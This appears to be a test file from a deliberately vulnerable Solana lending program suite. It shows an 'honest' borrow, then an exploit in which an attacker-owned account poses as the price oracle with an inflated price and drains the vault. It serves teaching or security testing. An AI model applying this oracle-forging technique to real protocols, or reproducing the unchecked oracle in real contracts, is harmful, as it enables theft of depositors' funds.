/**
 * VULN 09 — Unvalidated price oracle.
 *
 * borrow() trusts the first 8 bytes of whatever account the caller passes
 * as the "price feed": no owner check, no freshness, no bounds. The
 * attacker forges a feed with a price big enough to make 1 collateral unit
 * cover the entire lending vault and borrows everyone's liquidity.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, nativeIx, sendTx, BN, SystemProgram,
} from "./util";

describe("vuln09 oracle manipulation", () => {
  const program = anchorProgram("vuln09_oracle_manipulation", PROG_IDS.vuln09);
  const oraclePda = findPda([seedsBuf("oracle")[0]], PROG_IDS.vuln09)[0];
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln09)[0];
  const posPdaOf = (user: any) => findPda([seedsBuf("pos")[0], user.publicKey.toBytes()], PROG_IDS.vuln09)[0];

  let mint: any, attacker: any, attackerAta: any, attackerPos: any, fakeOracle: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, mint, attackerAta, provider.wallet.publicKey, 10);

    await program.methods.initialize(new BN(1_000_000)).accounts({ mint }).rpc();

    // The lending vault is seeded with 1,000,000 loan units (depositors).
    await mintTo(provider.connection, provider.wallet.payer, mint, vaultPda, provider.wallet.publicKey, 1_000_000);

    attackerPos = posPdaOf(attacker);
    await program.methods.depositCollateral(new BN(1))
      .accounts({ position: attackerPos, user: attacker.publicKey, userAta: attackerAta, vault: vaultPda })
      .signers([attacker]).rpc();
  });

  it("honest path: with the real oracle 1 collateral covers 1M loan units", async () => {
    const before = await tokenBalance(attackerAta);
    await program.methods.borrow(new BN(500_000))
      .accounts({
        position: attackerPos,
        user: attacker.publicKey,
        oracle: oraclePda,
        destinationAta: attackerAta,
        vault: vaultPda,
      })
      .signers([attacker]).rpc();
    // ATA grew by exactly the borrowed amount — the 1 unit of collateral
    // stays locked in the position; the vault paid out half its liquidity.
    // (vault = 1,000,000 seeded + 1 deposited - 500,000 borrowed)
    assert.equal(((await tokenBalance(attackerAta)) - before).toString(), "500000");
    assert.equal((await tokenBalance(vaultPda)).toString(), "500001");
  });

  it("attacker forges the oracle and drains the lending vault", async () => {
    // mode 1 of the attacker program: an account owned by the attacker
    // program whose bytes [8..16] are the "price". 531,000 covers the
    // remaining vault with just 1 unit of collateral. Layout matches the
    // protocol oracle (discriminator + u64) — the program never checks WHOSE
    // account it is.
    const price = Buffer.alloc(16);
    price.writeBigUInt64LE(531_000n, 8);
    fakeOracle = findPda([seedsBuf("forge")[0], price.slice(0, 8)], PROG_IDS.attacker)[0];
    await sendTx(
      [
        nativeIx(
          PROG_IDS.attacker, 1, price,
          [
            { pubkey: fakeOracle, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        ),
      ],
      [attacker],
    );

    await program.methods.borrow(new BN(500_000))
      .accounts({
        position: attackerPos,
        user: attacker.publicKey,
        oracle: fakeOracle, // BUG: any account is accepted
        destinationAta: attackerAta,
        vault: vaultPda,
      })
      .signers([attacker]).rpc();

    assert.equal((await tokenBalance(vaultPda)).toString(), "1"); // 500,001 - 500,000: the deposit's token
    assert.equal((await tokenBalance(attackerAta)).toString(), "1000009"); // 500,009 + 500,000 drained
  });
});
